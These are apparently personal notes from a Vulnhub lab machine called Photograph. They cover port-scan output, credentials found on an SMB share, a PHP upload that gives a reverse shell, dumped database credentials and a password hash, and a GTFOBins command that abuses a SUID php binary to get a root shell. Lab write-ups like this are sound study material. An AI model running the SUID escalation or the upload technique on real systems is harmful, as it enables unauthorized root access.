# Photograph

Author: Vulnhub
Difficulty: 2
Key takeaway: check for SUID → priv esc in GTFO bins
Tags: SMB, SUID, koken, php7.2
Type: Linux

# Enumeration

- portscan

```bash
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Koken API error
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 08:00:27:67:0A:6B (Oracle VirtualBox virtual NIC)
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h20m03s, deviation: 2h18m34s, median: 2s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2021-11-02T14:07:40-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-02T18:07:40
|_  start_date: N/A
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

- dir scan

```bash
# nothing interesting found here on port 80
# found /admin and /storage on port 8000
```

- the credentials for koken admin api were present inside mailsent.txt that was obtained from the smbshare

```bash
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

# Initial Access

- uploaded a php script to the dashboard and accessed it through the browser to get a reverse shell as www-data

# Privilege Escalation

```bash
www-data@photographer:/var/www/html/koken/storage/configuration$ cat key.php
<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

// Do not edit or remove this file unless advised by Koken support
// support@koken.me

peturn 'fb3ab2ea3b3ad12c42c064d680826832';www-data@photographer:/var/www/html/koken/storage/configuration$ cat database.ph
<?php
        return array(
                'hostname' => 'localhost',
                'database' => 'koken',
                'username' => 'kokenuser',
                'password' => 'user_password_here',
                'prefix' => 'koken_',
                'socket' => ''
        );
```

- found password hashes inside the mariadb database

```bash
+----+--------------------------------------------------------------+------------------------+------------+-------------+------------+-----------+-------------------+------------------+----------------+------------------------+---------+----------+--------+----------------------------------+-------------+
| id | password                                                     | email                  | created_on | modified_on | first_name | last_name | public_first_name | public_last_name | public_display | public_email           | twitter | facebook | google | internal_id                      | remember_me |
+----+--------------------------------------------------------------+------------------------+------------+-------------+------------+-----------+-------------------+------------------+----------------+------------------------+---------+----------+--------+----------------------------------+-------------+
|  1 | $2a$08$ruF3jtzIEZF1JMy/osNYj.ibzEiHWYCE4qsC6P/sMBZorx2ZTSGwK | daisa@photographer.com | 1595292775 |  1595292775 | daisa      | ahomi     | daisa             | ahomi            | both           | daisa@photographer.com | NULL    | NULL     | NULL   | 6d9505613547705d48ec6ac1792b18e0 | NULL        |
+----+--------------------------------------------------------------+------------------------+------------+-------------+------------+-----------+-------------------+------------------+----------------+------------------------+---------+----------+--------+----------------------------------+-------------+
```

- php7.2 → SUID variable can be exploited to get root shell

> SUID
> 
> 
> If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
> 
> This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
> 
> ```bash
> sudo install -m =xs $(which php) .
> 
> CMD="/bin/sh"
> ./php -r "pcntl_exec('/bin/sh', ['-p']);"
> ```
> 

# Notes

-